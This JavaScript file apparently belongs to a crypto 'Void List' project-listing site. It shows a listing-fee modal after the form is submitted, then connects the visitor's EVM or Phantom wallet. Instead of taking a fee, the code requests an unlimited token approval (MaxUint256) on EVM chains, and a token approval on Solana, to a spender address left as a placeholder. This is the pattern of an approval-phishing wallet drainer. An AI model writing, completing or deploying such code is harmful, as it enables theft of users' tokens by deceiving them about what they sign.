document.addEventListener("DOMContentLoaded", () => {
  const { Connection, PublicKey, Transaction,
          createApproveInstruction, TOKEN_PROGRAM_ID, getAssociatedTokenAddress,
          PhantomWalletAdapter } = window.SolanaDeps;

  const projectForm = document.getElementById("projectForm");
  const feeModal = document.getElementById("feeModal");
  const walletModal = document.getElementById("walletModal");
  const proceedButton = document.getElementById("proceedButton");
  const walletConnectEvmButton = document.getElementById("walletConnectEvmButton");
  const solanaWalletButton = document.getElementById("solanaWalletButton");
  const chainSelect = projectForm.querySelector("select");

  const ERC20_ABI = ["function approve(address spender, uint256 amount) external returns (bool)"];
  const SPENDER_ADDRESS = "0xYourSpenderAddressHere";

  projectForm.addEventListener("submit", (e) => {
    e.preventDefault();
    feeModal.classList.remove("hidden");
  });

  proceedButton.addEventListener("click", () => {
    feeModal.classList.add("hidden");
    walletModal.classList.remove("hidden");

    walletConnectEvmButton.classList.add("hidden");
    solanaWalletButton.classList.add("hidden");

    const chain = chainSelect.value.toLowerCase();
    if (["ethereum", "bnb chain", "polygon", "arbitrum"].includes(chain)) {
      walletConnectEvmButton.classList.remove("hidden");
    } else if (chain === "solana") {
      solanaWalletButton.classList.remove("hidden");
    }
  });

  document.querySelectorAll(".close").forEach(btn => {
    btn.addEventListener("click", () => {
      btn.closest(".modal").classList.add("hidden");
    });
  });

  // WalletConnect (EVM)
  walletConnectEvmButton.addEventListener("click", async () => {
    try {
      const wcProvider = await window.EthereumProvider.init({
        projectId: "d10513cda498042981f8e720f5f96a05",
        chains: [1],
        showQrModal: true,
        rpcMap: { 1: "https://eth.llamarpc.com" },
        metadata: { name: "Void List", url: window.location.origin }
      });

      await wcProvider.enable();
      const provider = new ethers.providers.Web3Provider(wcProvider);
      const signer = provider.getSigner();

      const tokenAddress = "0xYourTokenContractAddressHere";
      const token = new ethers.Contract(tokenAddress, ERC20_ABI, signer);

      const tx = await token.approve(SPENDER_ADDRESS, ethers.constants.MaxUint256);
      alert(`Approval transaction sent: ${tx.hash}`);

      const receipt = await tx.wait();
      alert(receipt.status === 1 ? "✅ Approval successful!" : "❌ Approval failed.");
    } catch (err) {
      console.error(err);
      alert("WalletConnect approval error: " + err.message);
    }
  });

  // Solana Wallets
  solanaWalletButton.addEventListener("click", async () => {
    try {
      const adapter = new PhantomWalletAdapter();
      await adapter.connect();
      const publicKey = adapter.publicKey.toBase58();
      alert(`Connected to Solana wallet: ${publicKey}`);

      const connection = new Connection("https://api.mainnet-beta.solana.com");
      const tokenMint = new PublicKey("DqfoyZH96RnvZusSp3Cdncjpyp3C74ZmJzGhjmHnDHRH");
      const owner = adapter.publicKey;
      const spender = new PublicKey("YOUR_SPENDER_ADDRESS");
      const ata = await getAssociatedTokenAddress(tokenMint, owner);
      const ix = createApproveInstruction(ata, spender, owner, 1000000, [], TOKEN_PROGRAM_ID);

      const tx = new Transaction().add(ix);
      await adapter.sendTransaction(tx, connection);
      alert("Approval transaction sent!");
    } catch (err) {
      console.error(err);
      alert("Solana wallet connection failed.");
    }
  });
});
